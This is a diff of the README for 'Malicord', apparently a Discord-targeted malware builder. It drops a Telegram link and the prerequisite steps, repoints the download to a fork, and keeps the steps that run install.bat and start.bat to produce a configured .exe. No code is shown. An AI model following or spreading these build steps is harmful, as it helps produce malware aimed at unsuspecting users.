@@ -6,7 +6,7 @@
   Malicord
 </h1>
 <p align="center">
-  Telegram server: https://t.me/+xM8hLV4lre81YjI8
+  
  </p>
 <p align="center"> 
   <kbd>
@@ -37,14 +37,11 @@
 ---
 
 ## <a id="setup"></a> 📁 〢 Setting up
-
-0. Install [Nodejs V18.5.0](https://nodejs.org/dist/v18.15.0/node-v18.15.0-x64.msi)
-1. Install [VisualStudio developpement desktop c+++](https://visualstudio.microsoft.com/de/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030)
-2. Install [Files](https://github.com/Malicord/Malicord/archive/refs/heads/main.zip)
-3. Install all modules [install.bat](https://github.com/Malicord/Malicord/blob/main/install.bat)
-4. Click on [start.bat](https://github.com/Malicord/Malicord/blob/main/start.bat)
-5. Complete the configuration
-6. You have your .exe file enjoy
+1. Install [Files]([https://github.com/just-cmd-1909/Malicord/archive/refs/heads/main.zip])
+2. Install all modules [install.bat]
+3. Click on [start.bat]
+4. Complete the configuration
+5. You have your .exe file enjoy
 
 <a id="features"></a>
 
